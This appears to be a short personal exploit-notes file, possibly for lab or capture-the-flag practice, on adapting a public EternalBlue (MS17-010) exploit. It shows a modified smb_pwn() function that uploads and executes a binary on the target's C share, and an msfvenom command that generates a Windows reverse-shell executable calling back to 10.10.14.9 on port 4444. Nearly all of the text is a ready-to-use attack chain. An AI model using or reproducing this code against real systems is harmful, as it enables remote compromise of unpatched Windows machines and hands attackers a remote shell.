# EXPLOITS

## EternalBlue
My favourite exploit for EternalBlue (MS17-010) CVE-2017-0144 is [This one](https://www.exploit-db.com/exploits/42315).
You can find the files inside EternalBlue directory.

In order to make it work, we need to modify the credentials:

```
USERNAME = ''
PASSWORD = ''
```

And the function __smb_pwn()__ to look like:

```
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        # print('creating file c:\\pwned.txt on the target')
        # tid2 = smbConn.connectTree('C$')
        # fid2 = smbConn.createFile(tid2, '/etblue.exe')

        # smbConn.closeFile(tid2, fid2)
        # smbConn.disconnectTree(tid2)

        print('pwned!!')
        smb_send_file(smbConn, './etblue.exe', 'C', '/etblue.exe')
        service_exec(conn, r'cmd /c c:\etblue.exe')
```

We also need to create a file named __etblue.exe__ (or whatever) containing our shellcode. We'll use __msfvenom__:

```
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.9 LPORT=4444 > etblue.exe
```